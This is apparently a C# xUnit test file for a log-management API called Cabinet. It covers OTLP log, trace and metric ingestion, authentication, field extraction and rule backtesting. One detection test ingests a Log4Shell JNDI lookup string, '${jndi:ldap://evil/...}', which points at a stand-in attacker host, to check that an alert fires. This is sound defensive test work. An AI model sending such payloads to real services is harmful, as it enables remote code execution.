using System.Diagnostics;
using System.IO.Compression;
using System.Net;
using System.Net.Http.Json;
using System.Net.Sockets;
using System.Text;
using System.Text.Json;
using Cabinet.API.Controllers;
using Cabinet.API.Services;
using FluentAssertions;
using Microsoft.Extensions.Logging;
using OpenTelemetry;
using OpenTelemetry.Exporter;
using OpenTelemetry.Logs;
using OpenTelemetry.Metrics;
using OpenTelemetry.Trace;
using OpenTelemetry.Resources;
using Xunit;

namespace Cabinet.Tests.Services;

public sealed class OtlpLogDecoderTests
{
    private const string Json = """
        {
          "resourceLogs": [{
            "resource": { "attributes": [
              { "key": "service.name", "value": { "stringValue": "checkout" } },
              { "key": "host.name", "value": { "stringValue": "web-1" } }
            ]},
            "scopeLogs": [{ "logRecords": [{
              "timeUnixNano": "1772600767000000000",
              "severityNumber": 17,
              "severityText": "ERROR",
              "body": { "stringValue": "payment failed" },
              "traceId": "5b8efff798038103d269b633813fc60c",
              "spanId": "eee19b7ec3c1b174",
              "attributes": [
                { "key": "http.status", "value": { "intValue": "503" } },
                { "key": "retry", "value": { "boolValue": true } },
                { "key": "ratio", "value": { "doubleValue": 0.5 } }
              ]
            }]}]
          }]
        }
        """;

    [Fact]
    public void Json_IsRead()
    {
        var record = OtlpLogDecoder.DecodeJson(Encoding.UTF8.GetBytes(Json)).Should().ContainSingle().Subject;

        record.TimeUnixNano.Should().Be(1772600767000000000);
        record.SeverityNumber.Should().Be(17);
        record.Body.Should().Be("payment failed");
        record.TraceId.Should().Be("5b8efff798038103d269b633813fc60c");
        record.Attribute("service.name").Should().Be("checkout");
        record.Attributes["http.status"].Should().Be(503L);
        record.Attributes["retry"].Should().Be(true);
        record.Attributes["ratio"].Should().Be(0.5);
    }

    [Theory]
    [InlineData(new byte[] { 0x0A })]
    [InlineData(new byte[] { 0x0A, 0x7F, 0x01 })]
    [InlineData(new byte[] { 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF })]
    [InlineData(new byte[] { 0x0F })]
    public void MalformedProtobuf_IsAFormatError_NotACrash(byte[] data)
    {
        var decode = () => OtlpLogDecoder.DecodeProtobuf(data);

        decode.Should().Throw<FormatException>();
    }

    [Fact]
    public void EmptyRequest_HasNoRecords()
    {
        OtlpLogDecoder.DecodeProtobuf(Array.Empty<byte>()).Should().BeEmpty();
        OtlpLogDecoder.DecodeJson(Encoding.UTF8.GetBytes("{}")).Should().BeEmpty();
    }
}

/// <summary>Through the real API, and from a real OpenTelemetry exporter.</summary>
public sealed class OtlpLogsApiTests : IAsyncLifetime
{
    private const string Key = "otlp-admin-key";

    private readonly string _directory = Directory.CreateTempSubdirectory("cabinet-otlp-").FullName;
    private Process _process = null!;
    private HttpClient _client = null!;
    private int _port;

    public async Task InitializeAsync()
    {
        var listener = new TcpListener(IPAddress.Loopback, 0);
        listener.Start();
        _port = ((IPEndPoint)listener.LocalEndpoint).Port;
        listener.Stop();

        var startInfo = new ProcessStartInfo("dotnet")
        {
            WorkingDirectory = _directory,
            RedirectStandardOutput = true,
            RedirectStandardError = true,
        };
        startInfo.ArgumentList.Add(typeof(LogsController).Assembly.Location);
        startInfo.Environment["ASPNETCORE_ENVIRONMENT"] = "Development";
        startInfo.Environment["ASPNETCORE_URLS"] = $"http://127.0.0.1:{_port}";
        startInfo.Environment["Storage__Type"] = "Memory";
        startInfo.Environment["ApiKeys__Keys__0__Key"] = Key;
        startInfo.Environment["ApiKeys__Keys__0__Tier"] = "Admin";
        _process = Process.Start(startInfo)!;
        _process.BeginOutputReadLine();
        _process.BeginErrorReadLine();

        _client = new HttpClient { BaseAddress = new Uri($"http://127.0.0.1:{_port}") };
        _client.DefaultRequestHeaders.Add("X-API-Key", Key);
        var deadline = DateTime.UtcNow.AddSeconds(90);
        while (DateTime.UtcNow < deadline)
        {
            try
            {
                using var response = await _client.GetAsync("/health/ready");
                if (response.IsSuccessStatusCode)
                {
                    return;
                }
            }
            catch (HttpRequestException)
            {
                // Not listening yet
            }

            await Task.Delay(100);
        }

        throw new TimeoutException("The API didn't become ready");
    }

    public async Task DisposeAsync()
    {
        _client.Dispose();
        _process.Kill(entireProcessTree: true);
        await _process.WaitForExitAsync();
        _process.Dispose();
        for (var attempt = 0; attempt < 10; attempt++)
        {
            try
            {
                Directory.Delete(_directory, recursive: true);
                return;
            }
            catch (Exception ex) when (ex is IOException or UnauthorizedAccessException && attempt < 9)
            {
                await Task.Delay(500);
            }
        }
    }

    private async Task<JsonElement> QueryAsync(string query, string? index = null)
    {
        using var response = await _client.PostAsJsonAsync("/api/v1/query/execute", new { query, index });
        var text = await response.Content.ReadAsStringAsync();
        response.IsSuccessStatusCode.Should().BeTrue(text);
        return JsonDocument.Parse(text).RootElement.GetProperty("results").Clone();
    }

    private static string RequestJson(string body) =>
        """{"resourceLogs":[{"resource":{"attributes":[{"key":"service.name","value":{"stringValue":"checkout"}},{"key":"host.name","value":{"stringValue":"web-1"}}]},"scopeLogs":[{"logRecords":[{"timeUnixNano":"1772600767000000000","severityNumber":17,"body":{"stringValue":"BODY"},"attributes":[{"key":"http.status","value":{"intValue":"503"}}]}]}]}]}"""
            .Replace("BODY", body, StringComparison.Ordinal);

    [Fact]
    public async Task JsonExport_IsStoredWithItsMeaning()
    {
        using var response = await _client.PostAsync("/v1/logs", new StringContent(RequestJson("payment failed"), Encoding.UTF8, "application/json"));
        response.StatusCode.Should().Be(HttpStatusCode.OK);
        (await response.Content.ReadAsStringAsync()).Should().Be("{}");

        var row = (await QueryAsync("find \"payment\""))[0];
        row.GetProperty("Host").GetString().Should().Be("web-1");
        row.GetProperty("SourceType").GetString().Should().Be("checkout");
        row.GetProperty("Severity").GetInt32().Should().Be(4);
        row.GetProperty("Timestamp").GetDateTime().Should().Be(new DateTime(2026, 3, 4, 5, 6, 7, DateTimeKind.Utc));
        row.GetProperty("http.status").GetInt64().Should().Be(503);
    }

    [Fact]
    public async Task RetriedExport_IsStoredOnce()
    {
        for (var i = 0; i < 3; i++)
        {
            using var response = await _client.PostAsync("/v1/logs", new StringContent(RequestJson("retried once"), Encoding.UTF8, "application/json"));
            response.EnsureSuccessStatusCode();
        }

        (await QueryAsync("find \"retried\" | stats count"))[0].GetProperty("count").GetInt32().Should().Be(1);
    }

    [Fact]
    public async Task GzippedExport_Works()
    {
        using var buffer = new MemoryStream();
        await using (var gzip = new GZipStream(buffer, CompressionMode.Compress, leaveOpen: true))
        {
            await gzip.WriteAsync(Encoding.UTF8.GetBytes(RequestJson("compressed line")));
        }

        var content = new ByteArrayContent(buffer.ToArray());
        content.Headers.ContentType = new System.Net.Http.Headers.MediaTypeHeaderValue("application/json");
        content.Headers.ContentEncoding.Add("gzip");
        using var response = await _client.PostAsync("/v1/logs", content);

        response.StatusCode.Should().Be(HttpStatusCode.OK);
        (await QueryAsync("find \"compressed\"")).GetArrayLength().Should().Be(1);
    }

    [Theory]
    [InlineData("text/plain", "hello", HttpStatusCode.UnsupportedMediaType)]
    [InlineData("application/json", "not json", HttpStatusCode.BadRequest)]
    [InlineData("application/x-protobuf", "\u000f", HttpStatusCode.BadRequest)]
    public async Task BadRequests_AreRefusedClearly(string contentType, string body, HttpStatusCode expected)
    {
        using var response = await _client.PostAsync("/v1/logs", new StringContent(body, Encoding.UTF8, contentType));

        response.StatusCode.Should().Be(expected);
    }

    [Fact]
    public async Task NoKey_IsRefused()
    {
        using var anonymous = new HttpClient { BaseAddress = _client.BaseAddress };

        using var response = await anonymous.PostAsync("/v1/logs", new StringContent("{}", Encoding.UTF8, "application/json"));

        response.StatusCode.Should().Be(HttpStatusCode.Unauthorized);
    }

    [Fact]
    public async Task RealOpenTelemetryExporter_OverProtobuf_IsUnderstood()
    {
        using var loggerFactory = LoggerFactory.Create(logging => logging.AddOpenTelemetry(options =>
        {
            options.SetResourceBuilder(ResourceBuilder.CreateDefault().AddService("exporter-test"));
            options.AddOtlpExporter(exporter =>
            {
                exporter.Endpoint = new Uri($"http://127.0.0.1:{_port}/v1/logs");
                exporter.Protocol = OtlpExportProtocol.HttpProtobuf;
                exporter.Headers = $"X-API-Key={Key}";
                exporter.ExportProcessorType = ExportProcessorType.Simple;
            });
        }));

        loggerFactory.CreateLogger("test").LogError("exporter says {Thing} broke", "widget");

        var deadline = DateTime.UtcNow.AddSeconds(20);
        JsonElement rows;
        do
        {
            await Task.Delay(100);
            rows = await QueryAsync("find \"exporter says\"");
        }
        while (rows.GetArrayLength() == 0 && DateTime.UtcNow < deadline);

        rows.GetArrayLength().Should().Be(1);
        var row = rows[0];
        row.GetProperty("SourceType").GetString().Should().Be("exporter-test");
        row.GetProperty("Severity").GetInt32().Should().Be(4);
        row.GetProperty("Thing").GetString().Should().Be("widget");
    }

    [Fact]
    public async Task EnabledDetection_FiresOnWhatsIngested_AndShowsInAlertHistory()
    {
        using (var enable = await _client.PostAsync("/api/v1/rules/log4shell/enable", null))
        {
            enable.StatusCode.Should().Be(HttpStatusCode.NoContent);
        }

        // Rules reload every few seconds, so retry with new events until it's picked up
        var deadline = DateTime.UtcNow.AddSeconds(30);
        var i = 0;
        string alerts;
        do
        {
            using var ingest = await _client.PostAsJsonAsync("/services/collector/event", new { @event = $"GET / ${{jndi:ldap://evil/{i++}}}" });
            ingest.EnsureSuccessStatusCode();
            await Task.Delay(500);
            alerts = await _client.GetStringAsync("/api/v1/alerts");
        }
        while (!alerts.Contains("Log4Shell", StringComparison.Ordinal) && DateTime.UtcNow < deadline);

        alerts.Should().Contain("Log4Shell").And.Contain("T1190");
    }

    private async Task<JsonElement> WaitForRowsAsync(string query, string? index = null)
    {
        var deadline = DateTime.UtcNow.AddSeconds(20);
        JsonElement rows;
        do
        {
            await Task.Delay(100);
            rows = await QueryAsync(query, index);
        }
        while (rows.GetArrayLength() == 0 && DateTime.UtcNow < deadline);

        return rows;
    }

    [Fact]
    public async Task RealOpenTelemetryExporter_Traces_BecomeSearchableSpans()
    {
        using var source = new ActivitySource("cabinet-trace-test");
        using (var provider = Sdk.CreateTracerProviderBuilder()
            .SetResourceBuilder(ResourceBuilder.CreateDefault().AddService("trace-test"))
            .AddSource(source.Name)
            .AddOtlpExporter(exporter =>
            {
                exporter.Endpoint = new Uri($"http://127.0.0.1:{_port}/v1/traces");
                exporter.Protocol = OtlpExportProtocol.HttpProtobuf;
                exporter.Headers = $"X-API-Key={Key}";
                exporter.ExportProcessorType = ExportProcessorType.Simple;
            })
            .Build())
        {
            using var parent = source.StartActivity("checkout-request", ActivityKind.Server)!;
            using (var child = source.StartActivity("charge-card", ActivityKind.Client)!)
            {
                child.SetTag("payment.provider", "acme");
                child.SetStatus(ActivityStatusCode.Error);
            }
        }

        var rows = await WaitForRowsAsync("find \"charge-card\"", "traces");

        rows.GetArrayLength().Should().Be(1);
        var span = rows[0];
        span.GetProperty("SourceType").GetString().Should().Be("trace-test");
        span.GetProperty("span.kind").GetString().Should().Be("client");
        span.GetProperty("status").GetString().Should().Be("error");
        span.GetProperty("payment.provider").GetString().Should().Be("acme");
        span.TryGetProperty("parent_span_id", out _).Should().BeTrue("it's a child span");
        span.TryGetProperty("duration_ms", out _).Should().BeTrue();
    }

    [Fact]
    public async Task RealOpenTelemetryExporter_Metrics_BecomeSearchablePoints()
    {
        using var meter = new System.Diagnostics.Metrics.Meter("cabinet-metric-test");
        var counter = meter.CreateCounter<long>("orders_placed");
        using (var provider = Sdk.CreateMeterProviderBuilder()
            .SetResourceBuilder(ResourceBuilder.CreateDefault().AddService("metric-test"))
            .AddMeter(meter.Name)
            .AddOtlpExporter(exporter =>
            {
                exporter.Endpoint = new Uri($"http://127.0.0.1:{_port}/v1/metrics");
                exporter.Protocol = OtlpExportProtocol.HttpProtobuf;
                exporter.Headers = $"X-API-Key={Key}";
            })
            .Build())
        {
            counter.Add(3, new KeyValuePair<string, object?>("region", "eu"));
            counter.Add(4, new KeyValuePair<string, object?>("region", "eu"));
            provider.ForceFlush().Should().BeTrue();
        }

        var rows = await WaitForRowsAsync("find \"orders_placed\"", "metrics");

        rows.GetArrayLength().Should().BeGreaterThan(0);
        var point = rows[0];
        point.GetProperty("metric.type").GetString().Should().Be("sum");
        point.GetProperty("region").GetString().Should().Be("eu");
        point.GetProperty("value").GetDouble().Should().Be(7);
    }

    [Fact]
    public async Task FieldExtraction_AppliesAtSearchTime_ToEventsAlreadyStored()
    {
        using (var ingest = await _client.PostAsJsonAsync("/services/collector/event", new { @event = "checkout order=A-1001 took 812ms" }))
        {
            ingest.EnsureSuccessStatusCode();
        }

        (await WaitForRowsAsync("find \"A-1001\"")).GetArrayLength().Should().Be(1);

        using (var bad = await _client.PostAsJsonAsync("/api/v1/field-extractions", new { name = "No groups", pattern = @"order=\S+" }))
        {
            bad.StatusCode.Should().Be(HttpStatusCode.BadRequest, "a pattern without a named group extracts nothing");
        }

        using (var create = await _client.PostAsJsonAsync("/api/v1/field-extractions", new { name = "Orders", pattern = @"order=(?<order_id>\S+) took (?<took_ms>\d+)ms" }))
        {
            create.IsSuccessStatusCode.Should().BeTrue(await create.Content.ReadAsStringAsync());
        }

        var rows = await QueryAsync("find \"A-1001\" | stats sum(took_ms) as total by order_id");

        rows.GetArrayLength().Should().Be(1);
        rows[0].GetProperty("order_id").GetString().Should().Be("A-1001");
        rows[0].GetProperty("total").GetDouble().Should().Be(812);
    }

    [Fact]
    public async Task Backtest_ShowsHowOftenARuleWouldHaveFired_WithoutAlerting()
    {
        for (var i = 0; i < 5; i++)
        {
            using var ingest = await _client.PostAsJsonAsync("/services/collector/event", new { @event = $"backtest-marker attempt {i}", host = "bt-1" });
            ingest.EnsureSuccessStatusCode();
        }

        (await WaitForRowsAsync("find \"backtest-marker\" | stats count as n | where n >= 5")).GetArrayLength().Should().Be(1);

        using var response = await _client.PostAsJsonAsync("/api/v1/rules/backtest", new
        {
            rule = new { name = "Marker burst", pattern = "backtest-marker", groupBy = "Host", threshold = 5, windowSeconds = 3600, severity = "Warning" },
            hours = 1,
        });
        var text = await response.Content.ReadAsStringAsync();
        response.IsSuccessStatusCode.Should().BeTrue(text);
        var result = JsonDocument.Parse(text).RootElement;

        result.GetProperty("matches").GetInt64().Should().Be(5);
        result.GetProperty("wouldFire").GetInt32().Should().Be(1);
        result.GetProperty("topGroups")[0].GetProperty("group").GetString().Should().Be("bt-1");
        (await _client.GetStringAsync("/api/v1/alerts")).Should().NotContain("Marker burst", "a backtest doesn't alert");
    }
}
